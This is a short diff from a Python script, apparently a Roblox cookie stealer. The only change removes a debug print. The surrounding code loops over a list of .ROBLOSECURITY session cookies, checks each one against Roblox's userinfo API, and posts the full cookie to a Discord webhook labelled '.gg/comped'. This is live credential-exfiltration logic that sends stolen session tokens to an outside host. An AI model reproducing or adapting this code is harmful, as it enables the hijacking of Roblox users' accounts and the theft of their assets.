@@ -71,7 +71,6 @@ class main:
 		for i in listofcookies:
 			try:
 				r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": i})
-				print(r)
 				info = {"content": '',"embeds": [{"description": f"cookie ; ```fix\n{i}\n```","color": 11014160}],"username": ".gg/comped","avatar_url": "https://cdn.discordapp.com/attachments/972533865354772561/1039775714469224509/IMG_7011.jpg","attachments": []}
 				requests.post(webhook,json=info)
 			except:pass
